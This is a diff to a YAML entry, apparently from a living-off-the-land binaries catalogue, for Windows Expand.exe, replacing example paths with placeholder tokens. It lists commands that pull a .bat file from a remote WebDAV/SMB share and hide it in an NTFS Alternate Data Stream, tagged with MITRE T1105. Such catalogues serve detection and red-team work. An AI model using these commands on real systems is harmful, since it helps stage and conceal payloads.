@@ -1,24 +1,24 @@
 ---
 Name: Expand.exe
 Description: Binary that expands one or more compressed files
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: expand \\webdav\folder\file.bat c:\ADS\file.bat
+  - Command: expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}
     Description: Copies source file to destination.
     Usecase: Use to copies the source file to the destination file
     Category: Download
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: expand c:\ADS\file1.bat c:\ADS\file2.bat
+  - Command: expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext}
     Description: Copies source file to destination.
     Usecase: Copies files from A to B
     Category: Copy
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
+  - Command: expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat
     Description: Copies source file to destination Alternate Data Stream (ADS)
     Usecase: Copies files from A to B
     Category: ADS
